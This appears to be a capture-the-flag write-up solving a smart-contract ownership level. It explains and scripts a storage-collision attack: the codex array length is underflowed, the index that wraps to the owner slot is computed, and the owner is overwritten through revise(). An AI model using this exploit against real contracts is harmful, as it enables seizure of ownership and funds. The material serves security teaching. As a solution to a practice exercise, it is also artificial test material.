### Goals

Claim ownership

### Exploit

In this level we would need to use storage collision. Since there can only be 2^256-1 slots in contracts if we somehow set the max length to (2^256-1) for codex some slots will obiously collide with other variables stored in contract. We call `retract()` function that shrinks the length of `codex` array by one, so when `codex` length is 0 it will become `type(uint256).max`

Owner is stored at storage slot0.

### Code

```code
let arraySlot = ethers.toBigInt(
  ethers.keccak256(
    "0x0000000000000000000000000000000000000000000000000000000000000001"
  )
);

// we substract from maxuint256 to find how far the starting slot of the codex is from end of storage and overflow it get owner slot
let collidingSlot = ethers.MaxUint256 - arraySlot + BigInt(1);
```

In console:

```
await contract.makeContact()
await contract.retract()
await contract.revise(collidingSlot, "YOUR_ADDRESS_PADDED")
```

Done!
